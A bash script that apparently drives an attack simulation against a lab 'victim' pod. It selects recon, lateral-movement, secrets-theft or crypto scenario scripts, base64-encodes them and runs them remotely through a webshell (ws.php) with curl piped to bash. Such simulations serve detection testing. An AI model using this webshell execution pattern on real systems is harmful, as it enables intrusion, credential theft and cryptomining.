#!/bin/bash
sleep 10
echo "started at `date`"
echo " "
case $SCENARIO in
    recon)
        attack_script=recon.sh
        ;;
    lateral-mov)
        attack_script=lateral-mov.sh
        ;;
    secrets)
        attack_script=secrets-and-files.sh
        ;;
    crypto)
        attack_script=crypto.sh
        python3 -m http.server 80 &
        ;;
    all)
        attack_script=all-scenarios.sh
        python3 -m http.server 80 &
        ;;
    webshell)
        echo "--- Webshell ---"
        echo "sending command \"whoami\" to victim"
        curl -Gs --data-urlencode "cmd=whoami" "http://$NAME-victim/ws.php"
        echo " "
        echo "--- simulation completed ---"
        exit
        ;;
    *)
        echo "No matching scenario found. exiting"
        exit
        ;;
    esac
script_b64=`cat $attack_script | base64 -w0`
echo "--- Webshell ---"
echo "sending payload request to the victim pod"
echo " "
curl -Gs --data-urlencode "cmd=echo $script_b64| base64 -d| bash" "http://$NAME-victim/ws.php"
echo "--- simulation completed ---"